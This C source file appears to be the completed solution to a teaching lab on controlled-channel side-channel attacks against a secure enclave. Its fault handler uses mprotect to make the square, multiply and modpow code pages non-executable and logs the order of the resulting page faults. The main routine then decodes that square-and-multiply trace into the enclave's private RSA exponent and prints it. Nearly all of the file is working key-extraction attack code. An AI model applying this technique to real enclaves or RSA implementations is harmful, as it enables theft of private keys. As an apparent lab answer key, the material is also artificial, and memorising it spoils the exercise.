/* utility headers */
#include "debug.h"
#include "pf.h"
#include "cacheutils.h"
#include <sys/mman.h>
#include "victim.h"

#define RSA_TEST_VAL    1234

int fault_fired = 0;
void *sq_pt = NULL, *mul_pt = NULL, *modpow_pt = NULL;

/* =========================== START SOLUTION =========================== */
#define MAX_SIZE 1000
// modpow - 1, sq - 2, mul - 3
int pages[MAX_SIZE], idx=0;

void *prev_page = NULL;
/* =========================== END SOLUTION =========================== */

void fault_handler(void *base_adrs)
{
    /* =========================== START SOLUTION =========================== */
    // printf("%lx\n", base_adrs);

    if(base_adrs == modpow_pt){
        pages[idx] = 1;

        // modpow is executed for the 1st time -- mark sq and mul as NON_EXECUTABLE
        if(prev_page == NULL){
            mprotect(sq_pt, 0x1000, PROT_NONE);
            mprotect(mul_pt, 0x1000, PROT_NONE);
        }
        else{
            // mark prev_page as NON_EXECUTABLE
            mprotect(prev_page, 0x1000, PROT_NONE);
        }
    }
    else if(base_adrs == sq_pt){
        pages[idx] = 2;
        
        // mark prev_page as NON_EXECUTABLE
        mprotect(prev_page, 0x1000, PROT_NONE);
    }
    else if(base_adrs == mul_pt){
        pages[idx] = 3;

        // mark prev_page as NON_EXECUTABLE
        mprotect(prev_page, 0x1000, PROT_NONE);
    }

    // mark current page as EXECUTABLE
    mprotect(base_adrs, 0x1000, PROT_EXEC);
    idx += 1;
    prev_page = base_adrs;
    /* =========================== END SOLUTION =========================== */

    fault_fired++;
}

int main( int argc, char **argv )
{
    int rv = 1, secret = 0;
    int cipher, plain;

    /* ---------------------------------------------------------------------- */
    info("registering fault handler..");
    register_fault_handler(fault_handler);

    /* ---------------------------------------------------------------------- */
    info_event("Calling enclave..");
    sq_pt = square;
    mul_pt = multiply;
    modpow_pt = GET_PFN(modpow);
    info("square at %p; muliply at %p; modpow at %p", sq_pt, mul_pt, modpow_pt);

    cipher = ecall_rsa_encode(RSA_TEST_VAL);
    plain = ecall_rsa_decode(cipher);
    info("secure enclave encrypted '%d' to '%d'; decrypted '%d'", RSA_TEST_VAL, cipher, plain);

    /* =========================== START SOLUTION =========================== */
    mprotect(modpow_pt, 0x1000, PROT_NONE);
    plain = ecall_rsa_decode(cipher);

    int rsa_d = 0, mask = 0x8000;

    printf("Access pattern: ");
    for(int i=0;i<idx;i++){
        printf("%d ", pages[i]);
    }
    printf("\n");

    int i=0;
    // accesses for random blinding, modpow for rsa_e
    while(mask > 0){
        if(pages[i] == 2 && i+2 < idx && pages[i+2] == 3){
            mask = mask >> 1;
            i += 4;
        }
        else if(pages[i] == 2){
            mask = mask >> 1;
            i += 2;
        }
        else i += 1;
    }

    // printf("i=%d\n", i);

    // actual decoding, modpow for rsa_d
    mask = 0x8000;
    while(mask > 0){
        // sq and mul -- bit is 1
        if(pages[i] == 2 && i+2 < idx && pages[i+2] == 3){
            rsa_d = rsa_d | mask;
            mask = mask >> 1;
            i += 4;
        }
        // sq only -- bit is 0
        else if(pages[i] == 2){
            mask = mask >> 1;
            i += 2;
        }
        else i += 1;
    }
    printf("\nsecret rsa_d = %d\n", rsa_d);
    /* =========================== END SOLUTION =========================== */

    info("all is well; exiting..");
	return 0;
}
